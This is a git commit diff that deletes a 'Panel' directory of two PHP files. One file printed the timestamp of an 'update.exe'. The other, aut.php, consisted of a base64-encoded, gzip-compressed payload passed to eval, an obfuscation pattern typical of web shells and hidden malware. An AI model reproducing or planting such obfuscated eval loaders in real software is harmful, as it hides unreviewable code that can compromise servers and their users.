7ae0549abcc9e291e78ca89a88845673abb855e4
Error <88781785+TheSadError@users.noreply.github.com>
2022-09-01 10:39:37 +0400

    Delete Panel directory

--- Panel/aut.php
+++
@@ -1,1 +0,0 @@
-<?php eval(stripslashes(gzinflate(base64_decode("s7ezsS/IKODl4lTJsTWwBtKZaQoaKsX52fk5trZKhkqaCtVAQU6V5Pz8bFuVeGd/f29P12illCylWJBqiHKwpG1uiqmGSkFicXF5flGKnkp8sGtQmGtQtFKQq69/iGu8o4tLkFKsJtRAkH2GYBNqweZnFtjCdagj6VAHW1OrkJpTnArRmZmXnFOakqpkYmCiB3S6Eliel8se6BMA")))); ?>
--- Panel/data/inex.php
+++
@@ -1,6 +0,0 @@
-<?
-error_reporting(0);
-$STATU = stat('update.exe');
-
-echo ''.date('d.m.Y H:i:s', $STATU['mtime']).'';
-?>
